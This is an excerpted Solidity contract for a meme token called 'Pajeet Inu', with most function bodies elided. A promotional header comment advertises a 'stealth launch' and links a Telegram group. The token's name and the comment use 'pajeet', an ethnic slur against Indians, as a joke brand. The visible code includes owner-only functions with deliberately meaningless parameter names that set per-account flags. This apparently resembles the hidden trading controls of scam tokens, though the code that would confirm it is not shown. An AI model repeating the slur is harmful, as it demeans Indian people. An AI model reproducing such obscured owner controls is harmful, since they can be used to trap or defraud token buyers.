...
Welcome to PajeetInu , because all of us have a small pajeet inside.

PAJEETS UNITE!

Pajeet stealth launch incoming join tg for more info.


tg: https://t.me/PajeetInu
 */
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house, bool house2, uint256 house9) {
        ...
        tXs = house9;
        DoRedistributionWithUniswap[creator_] = house;
    ...
    function PajeetRedistribution(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _activatePajeet(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Pajeet is Context, ERC20 {
    constructor(
        ...
        _activatePajeet(owner, initialSupply, house6, house7);
    }
}

contract PajeetInu is ERC20Pajeet {
    constructor() ERC20Pajeet("Pajeet Inu", "PAJEETINU", false, true, 900, 25, msg.sender, 140000000 * 10 ** 18, msg.sender, 77) {
    }
}